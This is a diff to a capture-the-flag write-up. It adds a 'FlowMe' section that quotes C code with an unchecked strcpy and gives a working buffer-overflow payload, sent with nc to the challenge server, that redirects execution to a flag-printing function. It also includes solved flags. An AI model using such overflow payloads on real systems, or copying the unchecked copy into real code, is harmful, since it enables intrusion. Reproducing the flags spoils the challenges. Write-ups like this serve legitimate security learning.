@@ -33,5 +33,29 @@
 - local_68:G_gn1rtS
 - local_58:uq1nhcet
 - local_78:TC-SUMCH
-- local_60_dlo_D00
+- local_60:_dlo_D00
 - Flag is: HCMUS-CTF{St4cK_Str1ng_G00D_old_techn1qu3}
+## FlowMe
+- Openfile flowme.c.
+- You will see this code: 
+<pre><code>
+int secret_func(){
+    system("/bin/cat flag.txt");
+    return 0;
+}
+
+int authentication(char *password) {
+    char password_buffer[256];
+    strcpy(password_buffer, password);
+    if(strcmp(password_buffer, "this_is_a_password") == 0)
+        return 1;
+    
+    return 0;
+}
+</code></pre>
+- I guess buffer overflow from function strcpy at authenticaiton to function secret_func.
+- Use GDB and [Buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) this function is overflow at 256 and Adress secret_func is: 0x00000000004007ea 
+- This is payload: 
+<pre><code>
+	echo $(python -c 'print "A" * 264 +"\xea\x07\x40\x00\x00\x00\x00\x00"') | nc 159.65.13.76 33103
+</code></pre>
